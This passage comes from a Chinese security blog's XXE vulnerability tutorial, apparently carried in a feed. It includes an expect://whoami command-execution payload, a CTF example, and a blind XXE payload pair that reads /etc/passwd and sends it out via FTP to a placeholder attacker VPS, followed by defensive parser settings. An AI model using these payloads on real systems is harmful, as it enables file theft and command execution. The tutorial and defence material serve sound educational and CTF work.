class="string">"utf-8"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"expect://whoami"</span> &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><h2 id="XXE与Flash跨域攻击（个人认为鸡肋）"><a href="#XXE与Flash跨域攻击（个人认为鸡肋）" class="headerlink" title="XXE与Flash跨域攻击（个人认为鸡肋）"></a>XXE与Flash跨域攻击（个人认为鸡肋）</h2><p>这个突破感觉几乎没有什么用，而且利用条件也相对苛刻很多，可以自行查看<a href="https://m.hundan.org/wooyun-2012-08182" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2012-08182</a><br><a href="https://m.hundan.org/wooyun-2011-02491" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2011-02491</a></p></li></ul><h1 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h1><p>博主很久之前写的，想来想去就不打算再增加例题和减少掉例题了(懒)，多少有点帮助，看着玩吧哈哈</p><h2 id="API："><a href="#API：" class="headerlink" title="API："></a>API：</h2><p><a href="http://web.jarvisoj.com:9882" target="_blank" rel="noopener">http://web.jarvisoj.com:9882</a><br><img src="https://img-blog.csdnimg.cn/20200210162334155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Blind-XXE思路："><a href="#Blind-XXE思路：" class="headerlink" title="Blind XXE思路："></a>Blind XXE思路：</h2><p>1.客户端发送payload1给web服务器<br>2.网络服务器向VPS获取恶意DTD，并执行文件读取payload2<br>3.网页服务器带着回显结果访问VPS上特定的FTP或者HTTP<br>4.通过VPS获得回显(NC监听端口)<br>payload1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> xml version= <span class="string">"1.0"</span> encoding= <span class="string">"UTF-8"</span> <span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE [&lt;!ENTITY ％ remote SYSTEM <span class="string">"http://vps/test.xml"</span>&gt; </span><br><span class="line">％remote;</span><br><span class="line">] &gt;</span><br></pre></td></tr></table></figure><p>payload2(服务器端文件)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY % trick SYSTEM 'ftp://VPS:21/%payload;'&gt;"</span>&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ul><li>1.及时升级第三方代码，中间件等</li><li>2.过滤用户输入数据</li><li>3.使用php及Java等语言的禁用外部实体方法</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php：libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">java: DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">python:from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="keyword">False</span>))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首先，我们需要对&lt;a href=&quot;https://www.runoob.com/xml/xml-tutorial.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;XML&lt;/a&gt;进行一定的了解，在这里不做过多的多余叙述，接下图为XML工作流程：&lt;br
      
    
    </summary>
    
    
      <category term="web漏洞总结" scheme="http://y-y-k.tk/categories/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="web" scheme="http://y-y-k.tk/tags/web/"/>
    
      <category term="web漏洞总结" scheme="http://y-y-k.tk/tags/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
</feed>
